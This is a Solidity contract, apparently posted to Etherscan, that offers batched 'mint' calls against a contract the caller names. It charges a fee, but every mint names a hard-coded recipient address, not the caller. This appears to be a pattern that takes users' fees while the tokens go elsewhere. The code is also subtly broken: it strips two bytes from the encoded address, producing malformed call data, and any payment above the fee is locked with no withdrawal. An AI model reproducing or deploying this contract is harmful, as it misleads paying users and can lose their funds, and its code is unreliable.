/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransaction {
    address public receiverAddress;
    bytes public data;
    address public contractCreator;
    uint256 public constant feeAmount = 0.0002 ether;

    constructor() {
        receiverAddress = 0x37c44B6dB049eC101f530CE1F62CE1e907804D17; 
        bytes memory addrBytes = abi.encodePacked(receiverAddress);
        bytes memory addrSlice = new bytes(addrBytes.length - 2);
        for (uint i = 2; i < addrBytes.length; i++) {
            addrSlice[i - 2] = addrBytes[i];
        }
        data = abi.encodePacked(hex"6a627842000000000000000000000000", addrSlice); 
        contractCreator = msg.sender; 
    }

    function executeBatchTransactions(address _contractAddress, uint batchCount) external payable {
        require(msg.value >= feeAmount, "Insufficient fee");

        for (uint i = 0; i < batchCount; i++) {
            (bool success, ) = _contractAddress.call{value: 0, gas: gasleft()}(data);
            require(success, "Batch transaction failed");
        }

        payable(contractCreator).transfer(feeAmount);
    }
}